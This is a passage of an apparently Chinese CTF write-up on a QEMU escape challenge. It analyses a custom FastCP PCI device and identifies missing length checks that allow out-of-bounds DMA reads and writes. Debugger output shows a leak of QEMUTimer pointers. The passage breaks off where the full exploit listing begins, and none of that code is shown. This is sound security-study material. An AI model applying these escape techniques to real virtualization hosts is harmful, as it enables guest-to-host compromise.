class="keyword">sizeof</span>(FastCP_CP_INFO), <span class="number">0</span>);</span><br><span class="line">                cpu_physical_memory_rw(item.CP_src, s-&gt;CP_buffer, item.CP_cnt, <span class="number">0</span>);</span><br><span class="line">                cpu_physical_memory_rw(item.CP_dst, s-&gt;CP_buffer, item.CP_cnt, <span class="number">1</span>);</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">while</span> (s-&gt;cp_state.CP_list_cnt &gt; i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* 只清 bit0 并按需中断 */</span></span><br><span class="line">                fastcp_clear_bits_then_maybe_irq(s, FASTCP_CMD_LIST);</span><br><span class="line">                s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 逐项预检查长度是否 ≤ 0x1000；一旦有一项超限则只清 bit0 并返回 */</span></span><br><span class="line">            <span class="type">uint64_t</span> off = <span class="number">0</span>, seen = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                FastCP_CP_INFO tmp;</span><br><span class="line">                cpu_physical_memory_rw(s-&gt;cp_state.CP_list_src + off, &amp;tmp, <span class="keyword">sizeof</span>(FastCP_CP_INFO), <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp.CP_cnt &gt; <span class="number">0x1000</span>) &#123;</span><br><span class="line">                    fastcp_clear_bits_then_maybe_irq(s, FASTCP_CMD_LIST);</span><br><span class="line">                    s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                seen++;</span><br><span class="line">                off += <span class="keyword">sizeof</span>(FastCP_CP_INFO);</span><br><span class="line">                <span class="keyword">if</span> (seen &gt;= s-&gt;cp_state.CP_list_cnt) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (s-&gt;cp_state.CP_list_cnt == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>; <span class="comment">/* 理论上不会到这 */</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/* 全部合法 → 实施拷贝 */</span></span><br><span class="line">                    <span class="type">uint64_t</span> i = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        FastCP_CP_INFO item;</span><br><span class="line">                        cpu_physical_memory_rw(s-&gt;cp_state.CP_list_src + <span class="keyword">sizeof</span>(FastCP_CP_INFO) * i, &amp;item, <span class="keyword">sizeof</span>(FastCP_CP_INFO), <span class="number">0</span>);</span><br><span class="line">                        cpu_physical_memory_rw(item.CP_src, s-&gt;CP_buffer, item.CP_cnt, <span class="number">0</span>);</span><br><span class="line">                        cpu_physical_memory_rw(item.CP_dst, s-&gt;CP_buffer, item.CP_cnt, <span class="number">1</span>);</span><br><span class="line">                        i++;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (s-&gt;cp_state.CP_list_cnt &gt; i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 完成后：清 bit0 并按需中断 */</span></span><br><span class="line">        fastcp_clear_bits_then_maybe_irq(s, FASTCP_CMD_LIST);</span><br><span class="line">        s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* 未知 cmd：不处理 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* case 2/4 且不满足 one：把 cmd 清 0，与反编译一致 */</span></span><br><span class="line">    s-&gt;cp_state.cmd = <span class="number">0</span>;</span><br><span class="line">    s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- QOM type info / registration ---- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo fastcp_info = &#123;</span><br><span class="line">    .name          = TYPE_FASTCP,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(FastCPState),</span><br><span class="line">    .instance_init = FastCP_instance_init,</span><br><span class="line">    .class_init    = FastCP_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_FastCP_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;fastcp_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_qemu_init_pci_FastCP_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    register_module_init(pci_FastCP_register_types, MODULE_INIT_QOM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>BAR0 只接受 8 字节访问且地址 ≤ 0x1F</strong>；有效寄存器：</p>
<ul>
<li><code>0x00</code>（只读）：<code>handling</code></li>
<li><code>0x08</code>：<code>CP_list_src</code></li>
<li><code>0x10</code>：<code>CP_list_cnt</code></li>
<li><code>0x18</code>：<code>cmd</code></li>
<li>其它返回 <code>-1</code>（读）或忽略（写）。</li>
</ul>
</li>
<li><p><strong>写 <code>cmd</code> 会“预约”一次定时器</strong>，到期后进入 <code>fastcp_cp_timer()</code>：</p>
<ul>
<li><code>cmd==1</code>：处理列表（可先做 <code>cnt≤0x1000</code> 的预检），完成后 <code>cmd &amp;= ~1</code>；</li>
<li><code>cmd==2</code>：单条从 <code>CP_src</code> 读到 <code>CP_buffer</code>，完成后 <code>cmd &amp;= ~3</code>；</li>
<li><code>cmd==4</code>：单条从 <code>CP_buffer</code> 写到 <code>CP_dst</code>，完成后 <code>cmd &amp;= ~7</code>吧；</li>
<li>若 <strong><code>cmd</code> 的 bit3（0x8）置位</strong>，完成后会置 <code>irq_status|=0x100</code> 并触发 **MSI(向量0)**，否则退回 <strong>INTx</strong>。</li>
</ul>
</li>
</ul>
<p>其中 <code>fastcp_cp_timer</code> 的 case 4 和 case 1 的 <code>cnt &gt; 0x10</code> 都没有进行长度检查，可造成越界读写。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FASTCP_CMD_PUSH: &#123; <span class="comment">/* 4 */</span></span><br><span class="line">    <span class="type">bool</span> one = (s-&gt;cp_state.CP_list_cnt == <span class="number">1</span>);</span><br><span class="line">    s-&gt;handling = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (one) &#123;</span><br><span class="line">        cpu_physical_memory_rw(s-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="keyword">sizeof</span>(FastCP_CP_INFO), <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, s-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>); <span class="comment">// s-&gt;CP_buffer =&gt; cp_info.CP_dst 越界读</span></span><br><span class="line">        <span class="comment">/* 清 bit0..2 并按需中断 */</span></span><br><span class="line">        fastcp_clear_bits_then_maybe_irq(s, FASTCP_CMD_LIST | FASTCP_CMD_PULL | FASTCP_CMD_PUSH);</span><br><span class="line">        s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> FASTCP_CMD_LIST: &#123; <span class="comment">/* 1 */</span></span><br><span class="line">    <span class="type">uint64_t</span> cnt = s-&gt;cp_state.CP_list_cnt;</span><br><span class="line">    s-&gt;handling = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cnt &gt; <span class="number">0x10</span>) &#123;</span><br><span class="line">        <span class="comment">/* 直接执行所有项 */</span></span><br><span class="line">        <span class="type">uint64_t</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            FastCP_CP_INFO item;</span><br><span class="line">            cpu_physical_memory_rw(s-&gt;cp_state.CP_list_src + <span class="keyword">sizeof</span>(FastCP_CP_INFO) * i, &amp;item, <span class="keyword">sizeof</span>(FastCP_CP_INFO), <span class="number">0</span>);</span><br><span class="line">            cpu_physical_memory_rw(item.CP_src, s-&gt;CP_buffer, item.CP_cnt, <span class="number">0</span>); <span class="comment">// item.CP_src =&gt; s-&gt;CP_buffer 越界写</span></span><br><span class="line">            cpu_physical_memory_rw(item.CP_dst, s-&gt;CP_buffer, item.CP_cnt, <span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (s-&gt;cp_state.CP_list_cnt &gt; i);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 完成后：清 bit0 并按需中断 */</span></span><br><span class="line">    fastcp_clear_bits_then_maybe_irq(s, FASTCP_CMD_LIST);</span><br><span class="line">    s-&gt;handling = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p> <strong><code>cpu_physical_memory_rw()</code></strong> 在 QEMU 里的用途是在 <strong>系统物理地址空间</strong>（<code>address_space_memory</code>）上，执行一段<strong>按字节</strong>的读&#x2F;写搬运。常见于“仿真设备做 DMA，把 guest 物理内存拷到 QEMU 本地缓冲、或反之”的场景。<strong>典型声明</strong>（不同版本几乎一致）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/exec/cpu-common.h */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="type">void</span> *buf, hwaddr len, <span class="type">int</span> is_write)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">cpu_physical_memory_read</span><span class="params">(hwaddr addr, <span class="type">void</span> *buf, hwaddr len)</span> &#123;</span><br><span class="line">    cpu_physical_memory_rw(addr, buf, len, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">cpu_physical_memory_write</span><span class="params">(hwaddr addr, <span class="type">const</span> <span class="type">void</span> *buf, hwaddr len)</span> &#123;</span><br><span class="line">    cpu_physical_memory_rw(addr, (<span class="type">void</span> *)buf, len, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>参数解释：</p>
<ul>
<li><code>addr</code>：<strong>guest 物理地址（GPA）</strong>，而非虚拟地址&#x2F;设备地址。</li>
<li><code>buf</code>：QEMU 进程内的 host 指针。</li>
<li><code>len</code>：字节数；函数内部可能按设备可接受的粒度（1&#x2F;2&#x2F;4&#x2F;8 等）<strong>拆分成多次访问</strong>。</li>
<li><code>is_write</code>：0&#x3D;从 <strong>guest→host</strong>，1&#x3D;从 <strong>host→guest</strong>。</li>
</ul>
<p>它只是个薄封装，会直接转调：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address_space_rw(&amp;address_space_memory, addr,</span><br><span class="line">                 MEMTXATTRS_UNSPECIFIED, buf, len, is_write);</span><br></pre></td></tr></table></figure></div>

<p>也就是说，它总是面向<strong>系统物理地址空间</strong>，并且用默认事务属性 <code>MEMTXATTRS_UNSPECIFIED</code>。</p>
</blockquote>
<p>越界读可以泄露后面的 <code>QEMUTimer</code> 的 <code>timer_list</code> 还有程序地址。</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>u 1
   0x5555558dd0d7 &lt;fastcp_cp_timer+599&gt;    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">ecx</font><font color="#000000">, </font><font color="#AF87FF">1</font>     <font color="#CC0000"><b>ECX</b></font> =&gt; 1
 ► <font color="#4E9A06"><b>0x5555558dd0dc</b></font> <font color="#4E9A06"><b>&lt;fastcp_cp_timer+604&gt; </b></font>   <font color="#AFD700"><b>call</b></font><font color="#000000">   </font><font color="#CC0000">cpu_physical_memory_rw</font>      &lt;<font color="#CC0000">cpu_physical_memory_rw</font>&gt;
        <b>rdi</b>: 0x51e8000
        <b>rsi</b>: <font color="#3465A4">0x5555572d2ec0</font> ◂— 0
        <b>rdx</b>: 0x1040
        <b>rcx</b>: 1
   0x5555558dd0e1 &lt;fastcp_cp_timer+609&gt;    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">rax</font><font color="#000000">, </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbx</font><font color="#000000"> + </font><font color="#AF87FF">0x9f0</font><font color="#000000">]</font>
<font color="#4E9A06"><b>pwndbg&gt; </b></font>telescope 0x5555572d2ec0+0x1000
00:0000│  <font color="#3465A4">0x5555572d3ec0</font> ◂— 0xffffffffffffffff
01:0008│  <font color="#3465A4">0x5555572d3ec8</font> —▸ <font color="#3465A4">0x5555565fa6e0</font> —▸ <font color="#3465A4">0x5555563b0db0 (qemu_clocks+16)</font> —▸ <font color="#3465A4">0x5555565fab10</font> ◂— <font color="#3465A4">0x5555563b0db0 (qemu_clocks+16)</font>
02:0010│  <font color="#3465A4">0x5555572d3ed0</font> —▸ <font color="#CC0000">0x5555558dce80 (fastcp_cp_timer)</font> ◂— <font color="#AFD700">push</font><font color="#000000"> </font><font color="#5FD7FF">r13</font>
03:0018│  <font color="#3465A4">0x5555572d3ed8</font> —▸ <font color="#3465A4">0x5555572d24c0</font> —▸ <font color="#3465A4">0x55555642c220</font> —▸ <font color="#3465A4">0x555556402060</font> —▸ <font color="#3465A4">0x5555564021e0</font> ◂— ...
04:0020│  <font color="#3465A4">0x5555572d3ee0</font> ◂— 0
05:0028│  <font color="#3465A4">0x5555572d3ee8</font> ◂— 0xf424000000000
06:0030│  <font color="#3465A4">0x5555572d3ef0</font> ◂— 0
07:0038│  <font color="#3465A4">0x5555572d3ef8</font> ◂— 0x61 /* &apos;a&apos; */
<font color="#4E9A06"><b>pwndbg&gt; </b></font>p *(QEMUTimer*)0x5555572d3ec0
&dollar;1 = {
  expire_time = -1,
  timer_list = <font color="#3465A4">0x5555565fa6e0</font>,
  cb = <font color="#3465A4">0x5555558dce80</font> &lt;<font color="#C4A000">fastcp_cp_timer</font>&gt;,
  opaque = <font color="#3465A4">0x5555572d24c0</font>,
  next = <font color="#3465A4">0x0</font>,
  attributes = 0,
  scale = 1000000
}
</pre>


<h2 id="完整-Exp-3"><a href="#完整-Exp-3" class="headerlink" title="完整 Exp"></a>完整 Exp</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span 